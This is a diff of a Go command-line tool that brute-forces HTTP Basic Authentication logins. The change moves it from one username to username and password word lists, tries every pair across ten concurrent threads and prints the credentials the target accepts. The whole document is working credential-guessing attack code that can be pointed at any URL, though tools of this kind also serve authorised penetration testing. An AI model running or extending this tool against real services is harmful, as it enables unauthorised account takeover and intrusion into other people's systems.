@@ -14,12 +14,45 @@ package main
 import (
     "os"
     "fmt"
-    "log"
     "sync"
     "net/http"
     "bufio"
     "strings"
 )
+
+
+type Cred struct {
+    User string
+    Pass string
+}
+
+
+func print_line(msg string) {
+    fmt.Printf("[*] %s\n", msg)
+}
+
+
+func print_good(msg string) {
+    fmt.Printf("[+] %s\n", msg)
+}
+
+
+func print_error(msg string) {
+    fmt.Printf("[E] %s\n", msg)
+}
+
+
+func open(filename string) *os.File {
+    /*
+    Open a file as read only.
+    */
+    data, err := os.Open(filename)
+    if err != nil {
+        print_error(err.Error())
+    }
+
+    return data
+}
 
 
 func basicAuth(url, username, password string) {
@@ -34,73 +67,84 @@ func basicAuth(url, username, password string) {
     resp, err := client.Do(req)
 
     if err != nil {
-        fmt.Println(err)
+        print_error(err.Error())
     } else if resp.StatusCode == 401 {
-
+        // print_error(fmt.Sprintf("Invalid: %s:%s", username, password))
     } else {
-        fmt.Printf("%s - %s:%s\n", url, username, password)
+        print_good(fmt.Sprintf("Valid: %s:%s\n", username, password))
     }
 }
 
 
 func main() {
     if len(os.Args) != 4 {
-        fmt.Println("Usage: brute_http_basic url username pass_file")
+        fmt.Println("Usage: brute_http_basic url user_file pass_file")
         os.Exit(1)
     }
 
     url := os.Args[1]
-    username := os.Args[2]
+    user_file := os.Args[2]
     pass_file := os.Args[3]
     threads := 10
 
-    // Open our password lists.
-    pwds, err := os.Open(pass_file)
-    if err != nil {
-        log.Fatal("Failed to open password file.")
-    }
+    // Open our username and password lists.
+    print_line(fmt.Sprintf("Opening username file: %s", user_file))
+    users := open(user_file)
 
-    // channels used for comms
-    passChan := make(chan string, threads)
+    print_line(fmt.Sprintf("Opening password file: %s", pass_file))
+    pwds := open(pass_file)
 
-    // Use a wait group for waiting for all threads to finish
+    // Create Channels
+    credChan := make(chan Cred, threads)
     processorGroup := new(sync.WaitGroup)
     processorGroup.Add(threads)
 
-    // Create goroutines for each of the number of threads
-    // specified.
+    // Create Threads
     for i := 0; i < threads; i++ {
         go func() {
             for {
-                pass := <-passChan
+                cred, ok := <- credChan
 
-                // Did we reach the end? If so break.
-                if pass == "" {
+                if ok {
+                    basicAuth(url, cred.User, cred.Pass)
+                } else {
                     break
                 }
-
-                // Mode-specific processing
-                basicAuth(url, username, pass)
             }
 
-            // Indicate to the wait group that the thread
-            // has finished.
             processorGroup.Done()
         }()
     }
 
-    defer pwds.Close()
+    print_line("Building credentials.")
+    uscan := bufio.NewScanner(users)
 
-    // Lazy reading of the password file line by line
-    pscan := bufio.NewScanner(pwds)
-    for pscan.Scan() {
-        pass := pscan.Text()
+    for uscan.Scan() {
+        user := uscan.Text()
 
-        if strings.HasPrefix(pass, "#") == false {
-            passChan <- pass
+        if strings.HasPrefix(user, "#") == true {
+            continue
         }
+
+        pscan := bufio.NewScanner(pwds)
+
+        for pscan.Scan() {
+            pass := pscan.Text()
+
+            if strings.HasPrefix(pass, "#") == true {
+                continue
+            }
+
+            credChan <- Cred{user, pass}
+        }
+
+        // Reset the password file so we can rescan it for the next user.
+        pwds.Seek(0, 0)
     }
 
-    close(passChan)
+    defer users.Close()
+    defer pwds.Close()
+
+    close(credChan)
     processorGroup.Wait()
 }
